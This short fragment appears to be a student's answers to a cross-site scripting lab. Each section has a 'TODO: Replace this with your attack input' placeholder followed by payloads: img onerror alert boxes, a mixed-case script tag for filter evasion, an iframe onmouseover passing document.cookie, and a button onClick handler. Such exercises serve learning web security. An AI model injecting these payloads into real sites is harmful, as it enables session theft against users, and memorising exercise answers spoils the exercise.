...
TODO: Replace this with your attack input.
  ...
  <img src onerror="alert('Hacked by Rashad:)')">
  or
...
TODO: Replace this with your attack input.
  ...
  <img src onerror="alert('You are Rashad:D')">
  or
...
TODO: Replace this with your attack input.
   ...
   <img src onerror="alert('My name is Rashad')">
   <ScRiPt>success()</sCriPt>
...
TODO: Replace this with your attack input.
  ...
  <iframe src=# onmouseover="success(document.cookie)"></iframe>
                                 or
   <button onClick="success()">Göndər</button>
